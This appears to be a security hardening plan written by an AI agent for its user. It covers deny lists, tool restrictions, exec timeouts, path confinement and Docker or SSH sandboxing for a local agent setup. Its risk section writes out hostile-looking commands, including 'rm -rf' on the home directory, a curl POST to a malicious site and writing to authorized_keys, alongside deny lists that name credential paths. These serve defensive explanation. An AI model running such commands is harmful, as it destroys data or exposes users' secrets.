# Hardening Plan — Without Sandbox

**Date:** 2026-03-24 19:08 GMT+2  
**Status:** Current config lacks process sandbox. Mitigations below.

---

## 📊 Current Security Posture

### What's Protected

| Protection | Status | Scope |
|---|---|---|
| **Gateway** | ✅ Local loopback only | No remote access |
| **Auth** | ✅ API key protected | OpenRouter token safe |
| **Approvals** | ✅ Required for exec | Must confirm each command |
| **Node deny list** | ✅ 7 commands blocked | camera, screen, contacts, calendar, etc |
| **Workspace isolation** | ⚠️ Partial | Can read/write outside workspace |

### What's NOT Protected

| Gap | Risk | Impact |
|---|---|---|
| **Process sandbox** | Host-level execution | Commands run with full user privileges |
| **Filesystem jail** | Full home/ access | Can read/write anywhere user can |
| **seccomp/AppArmor** | Unrestricted syscalls | Can call any system function |
| **Network isolation** | Full network access | Can make any network connection |

---

## 🚀 Available Mitigations (Without Docker)

### Mitigation 1: Stricter Deny Lists

**Current deny list (7 items):**
```json
"denyCommands": [
  "camera.snap", "camera.clip", "screen.record",
  "contacts.add", "calendar.add", "reminders.add", "sms.send"
]
```

**Enhanced deny list (suggested):**
```json
"denyCommands": [
  "camera.snap", "camera.clip", "screen.record",
  "contacts.add", "calendar.add", "reminders.add", "sms.send",
  "disk.format", "disk.erase", "disk.unmount",
  "system.restart", "system.shutdown", "system.sleep",
  "password.set", "password.change",
  "network.dns.set", "firewall.modify",
  "user.add", "user.delete", "user.modify",
  "file.delete-permanent",
  "registry.modify"
]
```

**Protection level:** 🟡 Medium  
**Why:** Prevents accidental/intentional destructive actions

---

### Mitigation 2: Tool-Level Restrictions

**Current state:**
```json
"tools": {
  "profile": "coding",
  "allow": "NOT SET",
  "deny": "NOT SET"
}
```

**Proposed (stricter):**
```json
"tools": {
  "profile": "coding",
  "allow": [
    "group:text",
    "group:web",
    "memory",
    "sessions",
    "cron",
    "web_search",
    "web_fetch"
  ],
  "deny": [
    "group:system",
    "group:device",
    "camera",
    "screen"
  ]
}
```

**What this blocks:**
- System commands (reboot, halt, etc)
- Device access (USB, hardware)
- Camera/screen capture
- But ALLOWS: file ops, web, memory, scripts

**Protection level:** 🟡 Medium  
**Why:** Whitelist safe tools, blacklist dangerous categories

---

### Mitigation 3: Elevated Command Restrictions

**Current state:**
```json
"tools": {
  "elevated": "NOT SET"
}
```

**Proposed:**
```json
"tools": {
  "elevated": {
    "mode": "deny",
    "exceptions": []
  }
}
```

**Effect:** No `sudo` or elevated commands allowed  
**Protection level:** 🟢 Good  
**Why:** Prevents privilege escalation

---

### Mitigation 4: Exec Timeout

**Add to agents.defaults:**
```json
"exec": {
  "timeout": 30000,
  "killSignal": "SIGTERM",
  "memoryLimit": "512M"
}
```

**Effect:** Commands auto-kill after 30s, memory limit  
**Protection level:** 🟡 Medium  
**Why:** Prevents runaway processes

---

### Mitigation 5: Workspace Confinement

**Add to agents.defaults:**
```json
"confinement": {
  "workspaceOnly": true,
  "allowedPaths": [
    "/home/domk/.openclaw/workspace",
    "/tmp"
  ],
  "deniedPaths": [
    "/home/domk/.ssh",
    "/home/domk/.local/share/passwords",
    "/etc/shadow",
    "/root"
  ]
}
```

**Effect:** Explicit whitelist of accessible paths  
**Protection level:** 🟢 Good  
**Why:** Prevents accidental data leakage

---

## 📋 Proposed Hardening Config (Option A: Without Docker)

```json
{
  "agents": {
    "defaults": {
      "model": { ... },
      "models": { ... },
      "workspace": "/home/domk/.openclaw/workspace",
      
      "tools": {
        "profile": "coding",
        "allow": [
          "group:text",
          "group:web",
          "memory",
          "sessions",
          "cron"
        ],
        "deny": [
          "group:system",
          "group:device",
          "camera",
          "screen"
        ]
      },
      
      "exec": {
        "timeout": 30000,
        "killSignal": "SIGTERM"
      },
      
      "confinement": {
        "workspaceOnly": true
      }
    }
  },
  
  "gateway": {
    "nodes": {
      "denyCommands": [
        "camera.snap", "camera.clip", "screen.record",
        "contacts.add", "calendar.add", "reminders.add", "sms.send",
        "system.restart", "system.shutdown",
        "disk.format", "disk.erase"
      ]
    }
  }
}
```

**Protection level:** 🟡 Medium  
**Limitations:** No process isolation, can still access host filesystem

---

## 🐳 Path A: Docker Sandbox (Later)

**When ready:**
```bash
sudo apt install docker.io docker-compose
sudo usermod -aG docker $USER
```

**Then add to config:**
```json
"sandbox": {
  "mode": "all",
  "backend": "docker",
  "workspaceAccess": "rw"
}
```

**Result:** Full process isolation, filesystem jail  
**Protection level:** 🟢 Good

---

## 🔐 Path B: SSH/OpenShell Sandbox (Later)

**Alternative if Docker not wanted:**
```bash
# Create unprivileged user for sandbox
sudo useradd -m -s /bin/bash openclaw-sandbox
sudo chmod 700 /home/openclaw-sandbox
```

**Then add to config:**
```json
"sandbox": {
  "mode": "all",
  "backend": "ssh",
  "user": "openclaw-sandbox",
  "host": "localhost"
}
```

**Result:** Process runs as different user, limited privileges  
**Protection level:** 🟡 Medium

---

## ⚠️ Current State Risk Assessment

### Without Mitigations
```
Risk Level: 🔴 HIGH
- Full host access
- No process isolation
- Arbitrary execution
```

### With Recommended Hardening (Option A above)
```
Risk Level: 🟡 MEDIUM
- Tool allowlist blocks dangerous categories
- Exec timeout prevents runaway
- Workspace confinement prevents accidental data access
- Still: No process isolation (can still exec arbitrary commands)
```

### With Docker (Path A)
```
Risk Level: 🟢 GOOD
- Full process isolation
- Filesystem jail
- Network namespace (optional)
```

### With SSH Sandbox (Path B)
```
Risk Level: 🟡 MEDIUM-GOOD
- Process runs as different user
- Limited filesystem access
- Still: Some shared resources
```

---

## 📝 What You Can Currently Execute (Risk)

### ✅ Safe Operations
- Read files from workspace
- Write files to workspace
- Run Python scripts (venv)
- Run Node scripts
- Git operations
- Web requests (curl, fetch)
- Playwright automation

### ⚠️ Requires Approval (Risky)
- System commands (ls, cat, find, etc) — need approval each time
- Installing packages (apt, pip, npm)
- Running arbitrary shell scripts
- Accessing files outside workspace

### ❌ Blocked by Node Policy
- Camera capture
- Screen recording
- Contact/calendar modifications
- SMS sending

### 🚨 Potential Issues
- `rm -rf /home/domk/*` — can execute, requires approval
- `curl -X POST malicious-site.com` — can execute, requires approval
- Writing to ~/.ssh/authorized_keys — can execute, requires approval
- Reading ~/.bash_history — can execute, requires approval

---

## 📊 Recommendation

### SHORT TERM (Now)
Apply **Hardening Option A** (without Docker):
- Add tool allowlist
- Add exec timeout
- Add workspace confinement
- Enhance deny list

**Protection:** Medium. Safe for development.

### MEDIUM TERM (Soon)
Install Docker if available:
```bash
sudo apt install docker.io
```

### LONG TERM (Optional)
Migrate to:
- Docker-based sandbox (Path A) — Full isolation
- SSH sandbox (Path B) — Lighter alternative

---

## Next Steps

Confirm which mitigations you want applied:
1. ✅ Tool allowlist + exec timeout? (Recommended)
2. ✅ Workspace confinement? (Good)
3. ✅ Enhanced deny list? (Optional, but safer)
4. 🐳 Install Docker now? (Not urgent)

Once approved, I'll show exact patches for each.
